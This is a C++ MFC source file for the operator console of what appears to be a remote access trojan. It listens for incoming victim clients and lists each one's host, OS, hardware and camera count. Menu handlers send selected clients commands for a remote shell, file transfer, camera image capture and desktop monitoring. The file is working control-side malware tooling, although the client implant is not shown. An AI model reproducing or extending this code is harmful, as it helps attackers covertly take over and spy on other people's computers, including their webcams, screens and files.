#include "pch.h"
#include "framework.h"
#include "MuaServer.h"
#include "MuaServerDlg.h"
#include "afxdialogex.h"

#include "RemoteShellDlg.h"
#include "FileTransferDlg.h"
#include "ImageCaptureDlg.h"
#include "DesktopMonitorDlg.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif


#define DEFAULT_ADDRESS (L"0.0.0.0")
#define DEFAULT_PORT (L"55555")


// CMuaServerDlg 对话框

CMuaServerDlg::CMuaServerDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_MUASERVER_DIALOG, pParent)
{
//#ifdef _DEBUG
	// 开启控制台窗口
	AllocConsole();
	FILE* stream = nullptr;
	freopen_s(&stream, "CONOUT$", "w", stdout);
//#endif

	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMuaServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CLIENT_LIST, m_ClientList);
	DDX_Control(pDX, IDC_EDIT_IP, m_EditIP);
	DDX_Control(pDX, IDC_EDIT_PORT, m_EditPort);
}


// 解决回车键 ESC 默认关闭窗口
BOOL CMuaServerDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_ESCAPE)     return   TRUE;
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN)   return   TRUE;
	else
		return CDialog::PreTranslateMessage(pMsg);

}


BEGIN_MESSAGE_MAP(CMuaServerDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_START_LISTEN, &CMuaServerDlg::OnBnClickedStartListen)		// 开始监听
	ON_BN_CLICKED(IDC_CLOSE_SOCKET, &CMuaServerDlg::OnBnClickedCloseSocket)		// 结束监听
	ON_NOTIFY(NM_RCLICK, IDC_CLIENT_LIST, &CMuaServerDlg::OnRClickMenu)			// 右键菜单
	ON_COMMAND(ID_CLOSE_CLIENT, &CMuaServerDlg::OnCloseClient)					// 关闭某个Client
	ON_COMMAND(ID_REMOTE_SHELL, &CMuaServerDlg::OnRemoteShell)			
	ON_COMMAND(ID_FILE_TRANSFER, &CMuaServerDlg::OnFileTransfer)
	ON_COMMAND(ID_IMAGE_CAPTURE, &CMuaServerDlg::OnImageCapture)
	ON_COMMAND(ID_DESKTOP_MONITOR, &CMuaServerDlg::OnDesktopMonitor)
	ON_MESSAGE(WM_RECV_CHANNEL_SUCCESS_C2S, &CMuaServerDlg::OnRecvChannelSuccessC2S)	// 接收到 CHANNEL_SUCCESS_C2S 数据包时
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CMuaServerDlg 消息处理程序

BOOL CMuaServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	
	// 修改CListCtrl的字体，使得等宽
	static CFont font;
	font.DeleteObject();
	font.CreatePointFont(100, _T("新宋体"));
	m_ClientList.SetFont(&font);


	// ClientList标题所需字段
	CString head[] = { TEXT("IP:PORT"), TEXT("TOKEN"), TEXT("主机名"), TEXT("操作系统"), TEXT("CPU"), TEXT("内存"), TEXT("摄像头数量")};

	// 插入列标题
	m_ClientList.InsertColumn(0, head[0], LVCFMT_LEFT, 150);
	m_ClientList.InsertColumn(1, head[1], LVCFMT_LEFT, 150);
	m_ClientList.InsertColumn(2, head[2], LVCFMT_LEFT, 150);
	m_ClientList.InsertColumn(3, head[3], LVCFMT_LEFT, 200);
	m_ClientList.InsertColumn(4, head[4], LVCFMT_LEFT, 300);
	m_ClientList.InsertColumn(5, head[5], LVCFMT_LEFT, 200);
	m_ClientList.InsertColumn(6, head[6], LVCFMT_LEFT, 100);

	// 设置ListCtrl风格样式，LVS_EX_GRIDLINES 网格，LVS_EX_FULLROWSELECT 选中整行
	m_ClientList.SetExtendedStyle(m_ClientList.GetExtendedStyle() | LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);


	// 设置窗口大小。并居中显示
	//MoveWindow(0, 0, 1200, 800, FALSE);
	CenterWindow(GetDesktopWindow());


	// 文本框的初始化内容
	m_EditIP.SetWindowText(DEFAULT_ADDRESS);
	m_EditPort.SetWindowText(DEFAULT_PORT);

	// 关闭监听按钮变灰
	GetDlgItem(IDC_CLOSE_SOCKET)->EnableWindow(FALSE);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMuaServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMuaServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



// 开始监听
void CMuaServerDlg::OnBnClickedStartListen()
{
	// 从输入框中获取监听IP、Port
	CString csIpAddress;
	m_EditIP.GetWindowText(csIpAddress);
	PWCHAR pwszIP = csIpAddress.AllocSysString();

	CString csPort;
	m_EditPort.GetWindowText(csPort);

	DWORD dwTemp = _ttoi(csPort);
	if (!(csPort.GetAllocLength() <= 5 && dwTemp <= 65535)) {		// 判断字符串长度，是为了防止_ttoi整数溢出
		MessageBox(L"监听端口格式错误", L"启动ServerSocket失败");
		return;
	}
	WORD wPort = (WORD)dwTemp;
	
	// 启动ServerSocket
	m_pServerSocket = new CServerSocket(TCP_PACK);
	m_pClientManager = new CClientManager();
	m_pServerSocket->InitSocket(pwszIP, wPort);
	BOOL bRes = m_pServerSocket->StartSocket();

	if (!bRes) {
		MessageBox(m_pServerSocket->m_pTcpPackServer->m_pTcpPackServer->GetLastErrorDesc(), L"启动SocketServer失败", 0);
	}

	// 开始监听按钮变灰，关闭监听按钮恢复
	GetDlgItem(IDC_START_LISTEN)->EnableWindow(FALSE);
	GetDlgItem(IDC_CLOSE_SOCKET)->EnableWindow(TRUE);
}


// 结束监听
void CMuaServerDlg::OnBnClickedCloseSocket() {
	delete m_pClientManager;
	delete m_pServerSocket;

	// 关闭监听按钮变灰，开始监听按钮恢复
	GetDlgItem(IDC_START_LISTEN)->EnableWindow(TRUE);
	GetDlgItem(IDC_CLOSE_SOCKET)->EnableWindow(FALSE);
}


void CMuaServerDlg::AddClient2List(QWORD qwClientToken, nsMainSocket::_LoginPacket_C2S mData) {
	CClientUnit* pClientUnit = m_pClientManager->GetClientUnitByToken(qwClientToken);

	WCHAR wszIpAndPort[32] = { 0 };
	wsprintf(wszIpAndPort, L"%s:%d", pClientUnit->m_wszIpAddress, pClientUnit->m_wPort);

	stringstream ssClientToken;
	ssClientToken << std::hex << qwClientToken;

	CHAR szCameraNum[4];
	_itoa_s(mData.dwCameraNum, szCameraNum, 4);

	// 插入到列表尾部
	DWORD dwInsertIndex = m_ClientList.GetItemCount();										

	// 额外的信息，这里用于保存本行对应的pClientUnit
	LV_ITEM   lvitemData = { 0 };
	lvitemData.mask = LVIF_PARAM;
	lvitemData.iItem = dwInsertIndex;
	lvitemData.lParam = (LPARAM)(pClientUnit);										

	USES_CONVERSION;

	m_ClientList.InsertItem(&lvitemData);
	m_ClientList.SetItemText(dwInsertIndex, 0, wszIpAndPort);								// IP:PORT
	m_ClientList.SetItemText(dwInsertIndex, 1, A2W(ssClientToken.str().c_str()));			// TOKEN
	m_ClientList.SetItemText(dwInsertIndex, 2, A2W(mData.sHostName.c_str()));				// 主机名
	m_ClientList.SetItemText(dwInsertIndex, 3, A2W(mData.sOsVersion.c_str()));				// 操作系统
	m_ClientList.SetItemText(dwInsertIndex, 4, A2W(mData.sCpuType.c_str()));				// CPU
	m_ClientList.SetItemText(dwInsertIndex, 5, A2W(mData.sMemoryInfo.c_str()));				// 内存
	m_ClientList.SetItemText(dwInsertIndex, 6, A2W(szCameraNum));							// 摄像头数量
}


// 按下右键时触发，选择客户端时显示右键菜单
void CMuaServerDlg::OnRClickMenu(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	// 选中了客户端后，才显示右键菜单
	if (m_ClientList.GetSelectedCount() <= 0) {
		*pResult = 0;
		return;
	}

	CMenu menu;

	//得到鼠标点击位置
	POINT pt = { 0 };
	GetCursorPos(&pt);			

	// 菜单资源ID
	menu.LoadMenu(IDR_RBUTTON_MENU);								

	// 显示右键菜单
	menu.GetSubMenu(0)->TrackPopupMenu(0, pt.x, pt.y, this);		

	*pResult = 0;
}


// 断开某个Client的连接
void CMuaServerDlg::OnCloseClient() {
	UINT i, uSelectedCount = m_ClientList.GetSelectedCount();
	int  nItem = 0;

	CClientUnit* pClientUnit = NULL;

	if (uSelectedCount > 0)
	{
		for (i = 0; i < uSelectedCount; i++)
		{
			nItem = m_ClientList.GetNextItem(nItem - 1, LVNI_SELECTED);
			if (nItem == -1) {
				break;
			}

			LV_ITEM  lvitemData = { 0 };
			lvitemData.mask = LVIF_PARAM;
			lvitemData.iItem = nItem;
			m_ClientList.GetItem(&lvitemData);
			pClientUnit = (CClientUnit*)lvitemData.lParam;

			if (pClientUnit != NULL) {
				m_pClientManager->DeleteClientUnit(pClientUnit);
			}
		}
	}
}


void CMuaServerDlg::OnClose() {
	// 关闭主控端程序之前，先关闭监听，不然关闭的时候调试器总会捕捉到异常
	OnBnClickedCloseSocket();

	CDialogEx::OnClose();
}


// 为啥c++没有python那样方便的装饰器呀，我的代码风格好丑
void CMuaServerDlg::OnRemoteShell() {
	UINT i, uSelectedCount = m_ClientList.GetSelectedCount();
	int  nItem = 0;

	CClientUnit* pClientUnit = NULL;

	if (uSelectedCount > 0)
	{
		for (i = 0; i < uSelectedCount; i++)
		{
			nItem = m_ClientList.GetNextItem(nItem - 1, LVNI_SELECTED);
			if (nItem == -1) {
				break;
			}

			LV_ITEM  lvitemData = { 0 };
			lvitemData.mask = LVIF_PARAM;
			lvitemData.iItem = nItem;
			m_ClientList.GetItem(&lvitemData);
			pClientUnit = (CClientUnit*)lvitemData.lParam;

			if (pClientUnit != NULL) {
				//CRemoteShellDlg* pRemoteShellDlg = new CRemoteShellDlg();

				m_pServerSocket->SendWithEnc(pClientUnit->m_dwMainSocketConnID, nsRemoteShell::REMOTE_SHELL_S2C);
			}
		}
	}
}


void CMuaServerDlg::OnFileTransfer() {
	UINT i, uSelectedCount = m_ClientList.GetSelectedCount();
	int  nItem = 0;

	CClientUnit* pClientUnit = NULL;

	if (uSelectedCount > 0)
	{
		for (i = 0; i < uSelectedCount; i++)
		{
			nItem = m_ClientList.GetNextItem(nItem - 1, LVNI_SELECTED);
			if (nItem == -1) {
				break;
			}

			LV_ITEM  lvitemData = { 0 };
			lvitemData.mask = LVIF_PARAM;
			lvitemData.iItem = nItem;
			m_ClientList.GetItem(&lvitemData);
			pClientUnit = (CClientUnit*)lvitemData.lParam;

			if (pClientUnit != NULL) {
				m_pServerSocket->SendWithEnc(pClientUnit->m_dwMainSocketConnID, nsFileTransfer::FILE_TRANSFER_S2C);
			}
		}
	}
}


void CMuaServerDlg::OnImageCapture(){
	UINT i, uSelectedCount = m_ClientList.GetSelectedCount();
	int  nItem = 0;

	CClientUnit* pClientUnit = NULL;

	if (uSelectedCount > 0)
	{
		for (i = 0; i < uSelectedCount; i++)
		{
			nItem = m_ClientList.GetNextItem(nItem - 1, LVNI_SELECTED);
			if (nItem == -1) {
				break;
			}

			LV_ITEM  lvitemData = { 0 };
			lvitemData.mask = LVIF_PARAM;
			lvitemData.iItem = nItem;
			m_ClientList.GetItem(&lvitemData);
			pClientUnit = (CClientUnit*)lvitemData.lParam;

			if (pClientUnit != NULL) {
				m_pServerSocket->SendWithEnc(pClientUnit->m_dwMainSocketConnID, nsImageCapture::IMAGE_CAPTURE_S2C);
			}
		}
	}
}



void CMuaServerDlg::OnDesktopMonitor() {
	UINT i, uSelectedCount = m_ClientList.GetSelectedCount();
	int  nItem = 0;

	CClientUnit* pClientUnit = NULL;

	if (uSelectedCount > 0)
	{
		for (i = 0; i < uSelectedCount; i++)
		{
			nItem = m_ClientList.GetNextItem(nItem - 1, LVNI_SELECTED);
			if (nItem == -1) {
				break;
			}

			LV_ITEM  lvitemData = { 0 };
			lvitemData.mask = LVIF_PARAM;
			lvitemData.iItem = nItem;
			m_ClientList.GetItem(&lvitemData);
			pClientUnit = (CClientUnit*)lvitemData.lParam;

			if (pClientUnit != NULL) {
				m_pServerSocket->SendWithEnc(pClientUnit->m_dwMainSocketConnID, nsDesktopMonitor::DESKTOP_MONITOR_S2C);
			}
		}
	}
}


// 接收到CHANNEL_SUCCESS_C2S数据包后调用此函数
LRESULT CMuaServerDlg::OnRecvChannelSuccessC2S(WPARAM wParam, LPARAM lParam)
{
	CClientSocket* pClientSocket = (CClientSocket*)lParam;
	CDialogEx* pServiceDialog = nullptr;

	BOOL bHaveDialog = FALSE;

	switch (pClientSocket->m_wServiceType) {
	
	// *************************************** 远程SHELL ***************************************

	case nsGeneralSocket::REMOTE_SHELL_SERVICE: {
		if (pClientSocket->m_wSocketType == nsGeneralSocket::ROOT_SOCKET_WITH_DIALOG_TYPE) {
			pServiceDialog = new CRemoteShellDlg(pClientSocket);
			bHaveDialog = TRUE;
		}
		break;
	}


	// *************************************** 文件传输 ***************************************
	case nsGeneralSocket::FILE_TRANSFER_SERVICE: {

		switch (pClientSocket->m_wSocketType) {
		case (nsGeneralSocket::ROOT_SOCKET_WITH_DIALOG_TYPE): {
			pServiceDialog = new CFileTransferDlg(pClientSocket);
			bHaveDialog = TRUE;
			break;
		}

		case (nsGeneralSocket::ROOT_SOCKET_TYPE): {
			CFileTransfer* pFileTransfer = new CFileTransfer(pClientSocket, FALSE);		// TODO
			pClientSocket->SetServiceObject(pFileTransfer);
			break;
		}

		case (nsFileTransfer::LIST_FILES_SOCKET): {
			CClientUnit* pClientUnit = m_pClientManager->GetClientUnitByToken(pClientSocket->m_qwClientToken);
			CClientSocket* pParentSocket = pClientUnit->GetClientSocketByTag(pClientSocket->m_dwParentSocketTag);
			if (pParentSocket == nullptr) {
				DebugPrint("[ERROR2] LIST_FILES_SOCKET找不到父Socket，断开此Socket连接\n");
				m_pServerSocket->Disconnect(pClientSocket->m_dwConnID);
			}
			else {
				if (pParentSocket->m_pServiceDialog != nullptr) {
					((CFileTransferDlg*)(pParentSocket->m_pServiceDialog))->CreateListSocketSuccess(pClientSocket);
				}
				else {
					((CFileTransfer*)(pParentSocket->m_pServiceObject))->CreateListSocketSuccess(pClientSocket);
				}
			}
			break;
		}

		case (nsFileTransfer::FILE_TRANSFER_SOCKET): {
			CClientUnit* pClientUnit = m_pClientManager->GetClientUnitByToken(pClientSocket->m_qwClientToken);
			CClientSocket* pParentSocket = pClientUnit->GetClientSocketByTag(pClientSocket->m_dwParentSocketTag);
			if (pParentSocket == nullptr) {
				DebugPrint("[ERROR2] FILE_TRANSFER_SOCKET找不到父Socket，断开此Socket连接\n");
				m_pServerSocket->Disconnect(pClientSocket->m_dwConnID);
			}
			else {
				if (pParentSocket->m_pServiceDialog != nullptr) {
					((CFileTransferDlg*)(pParentSocket->m_pServiceDialog))->CreateFileSocketSuccess(pClientSocket);
				}
				else {
					((CFileTransfer*)(pParentSocket->m_pServiceObject))->CreateFileSocketSuccess(pClientSocket);
				}
			}
			break;
		}

		}

		break;
	}


	// *************************************** 图像捕获 ***************************************

	case nsGeneralSocket::IMAGE_CAPTURE_SERVICE: {
		if (pClientSocket->m_wSocketType == nsGeneralSocket::ROOT_SOCKET_WITH_DIALOG_TYPE) {
			pServiceDialog = new CImageCaptureDlg(pClientSocket);
			bHaveDialog = TRUE;
		}
		break;
	}


	// *************************************** 桌面监控 ***************************************
	
	case nsGeneralSocket::DESKTOP_MONITOR_SERVICE: {

		switch (pClientSocket->m_wSocketType) {
		case (nsGeneralSocket::ROOT_SOCKET_WITH_DIALOG_TYPE): {
			pServiceDialog = new CDesktopMonitorDlg(pClientSocket);
			bHaveDialog = TRUE;
			break;
		}


		case (nsDesktopMonitor::IMAGE_SOCKET): {
			CClientUnit* pClientUnit = m_pClientManager->GetClientUnitByToken(pClientSocket->m_qwClientToken);
			CClientSocket* pParentSocket = pClientUnit->GetClientSocketByTag(pClientSocket->m_dwParentSocketTag);
			if (pParentSocket == nullptr) {
				DebugPrint("[ERROR2] IMAGE_SOCKET找不到父Socket，断开此Socket连接\n");
				m_pServerSocket->Disconnect(pClientSocket->m_dwConnID);
			}
			else {
				((CDesktopMonitorDlg*)(pParentSocket->m_pServiceDialog))->CreateImageSocketSuccess(pClientSocket);
			}
			break;
		}

		//case (nsFileTransfer::FILE_TRANSFER_SOCKET): {
		//	CClientUnit* pClientUnit = m_pClientManager->GetClientUnitByToken(pClientSocket->m_qwClientToken);
		//	CClientSocket* pParentSocket = pClientUnit->GetClientSocketByTag(pClientSocket->m_dwParentSocketTag);
		//	if (pParentSocket == nullptr) {
		//		DebugPrint("[ERROR2] FILE_TRANSFER_SOCKET找不到父Socket，断开此Socket连接\n");
		//		m_pServerSocket->Disconnect(pClientSocket->m_dwConnID);
		//	}
		//	else {
		//		if (pParentSocket->m_pServiceDialog != nullptr) {
		//			((CFileTransferDlg*)(pParentSocket->m_pServiceDialog))->CreateFileSocketSuccess(pClientSocket);
		//		}
		//		else {
		//			((CFileTransfer*)(pParentSocket->m_pServiceObject))->CreateFileSocketSuccess(pClientSocket);
		//		}
		//	}
		//	break;
		//}

		}

		break;
	}

	}


	if (bHaveDialog) {
		pClientSocket->SetServiceDialog(pServiceDialog);
	}

	m_pServerSocket->SendWithEnc(pClientSocket->m_dwConnID, nsGeneralSocket::CHANNEL_SUCCESS_S2C);

	return 0;
}